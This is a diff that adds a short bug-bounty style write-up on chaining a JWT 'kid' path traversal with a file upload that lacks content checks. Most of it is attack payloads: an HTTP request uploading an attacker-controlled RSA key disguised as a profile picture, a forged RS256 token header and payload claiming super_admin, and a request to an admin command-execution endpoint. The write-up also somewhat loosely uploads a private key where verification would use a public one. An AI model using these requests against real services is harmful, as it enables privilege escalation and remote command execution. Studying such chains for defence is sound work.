@@ -1,0 +1,56 @@
+The overlooked low bug
+
+    JWT uses kid (Key ID) header parameter to fetch verification key from file:// or https://
+
+    Many apps allow kid: ../../../../etc/passwd but sanitize error messages → low severity (info leak only)
+
+The chaining enabler
+
+    App has file upload for profile pictures → but also accepts .pem files disguised as .jpg (no magic byte check)
+
+Advanced chain
+Step 1 – Upload malicious RSA key as "profile picture"
+http
+
+POST /api/v1/user/avatar HTTP/1.1
+Host: target.com
+Authorization: Bearer <user_token>
+Content-Type: multipart/form-data
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="avatar"; filename="key.jpg"
+Content-Type: image/jpeg
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA... (attacker-controlled key)
+-----END RSA PRIVATE KEY-----
+------WebKitFormBoundary--
+
+Server stores it at:
+/uploads/avatars/2026/04/14/key.jpg
+Step 2 – Craft malicious JWT with kid path traversal
+json
+
+Header:
+{
+  "alg": "RS256",
+  "kid": "../../uploads/avatars/2026/04/14/key.jpg"
+}
+
+Payload:
+{
+  "user_id": "admin",
+  "role": "super_admin",
+  "exp": 9999999999
+}
+
+Step 3 – Send JWT to privileged endpoint
+http
+
+GET /api/v1/admin/system/exec?cmd=id HTTP/1.1
+Host: target.com
+Authorization: Bearer <crafted_jwt>
+
+Server fetches key from traversed path, uses attacker's key to verify → RCE as admin.
+
+Why P1: Remote code execution on production.
